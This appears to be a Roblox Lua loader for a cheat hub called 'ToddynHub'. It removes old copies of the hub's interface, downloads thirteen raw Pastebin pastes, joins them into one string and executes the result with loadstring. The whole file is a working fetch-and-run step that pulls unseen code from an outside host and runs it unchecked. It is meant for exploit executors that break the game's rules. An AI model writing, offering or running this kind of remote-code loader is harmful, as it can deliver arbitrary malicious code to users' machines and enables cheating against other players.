_G.ToddynHubLoaded = nil
_G.Toddynho201Loaded = nil

for _, obj in ipairs(game:GetService("CoreGui"):GetChildren()) do
    if obj.Name == "ToddynHub" or obj.Name == "ToddynhoHub201" then
        obj:Destroy()
    end
end

task.wait(0.3)

local links = {
    'https://pastebin.com/raw/hZysC6V5',
    'https://pastebin.com/raw/V1PzyDQb',
    'https://pastebin.com/raw/usaNx6CJ',
    'https://pastebin.com/raw/YKZqpVpC',
    'https://pastebin.com/raw/jdGZNNfV',
    'https://pastebin.com/raw/UTcmBeZm',
    'https://pastebin.com/raw/prTiXBx6',
    'https://pastebin.com/raw/CkFKBhmS',
    'https://pastebin.com/raw/jrbpiJhs',
    'https://pastebin.com/raw/CEgNcQhx',
    'https://pastebin.com/raw/HAPUdLQF',
    'https://pastebin.com/raw/cwaPzq3F',
    'https://pastebin.com/raw/YVqGDmkJ',
}

local codigo = ''
for i, url in ipairs(links) do
    local ok, parte = pcall(function() return game:HttpGet(url) end)
    if ok and parte then
        codigo = codigo .. parte .. '\n'
    end
    task.wait(0.1)
end

loadstring(codigo)()
